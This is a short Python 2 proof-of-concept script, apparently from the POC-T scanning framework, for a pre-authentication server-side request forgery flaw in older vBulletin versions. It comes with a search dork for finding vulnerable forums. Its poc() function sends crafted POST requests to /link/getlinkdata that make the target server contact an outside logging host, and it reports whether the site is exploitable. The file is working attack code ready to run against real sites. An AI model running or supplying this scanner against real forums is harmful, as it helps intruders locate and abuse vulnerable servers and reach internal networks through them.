#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
vBulletin Preauth Server Side Request Forgery (SSRF)

Version
  <= 5.2.2  <= 4.2.3  <= 3.8.9

Dork
  "Powered by vBulletin"

Exploit
  http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt

"""

import requests

req_timeout = 10
ssrf_dst = 'http://dnslog.info'  # scheme needed
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'}


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    targeturl = url.rstrip('/') + "/link/getlinkdata"
    try:
        c = requests.post(targeturl, data={'url': '  '}, headers=header, timeout=req_timeout).content
        if 'invalid_url' not in c:
            return False
        c = requests.post(targeturl, data={'url': ssrf_dst}, headers=header, timeout=req_timeout).content
        if 'invalid_url' not in c:
            return True
    except Exception, e:
        pass
    return False
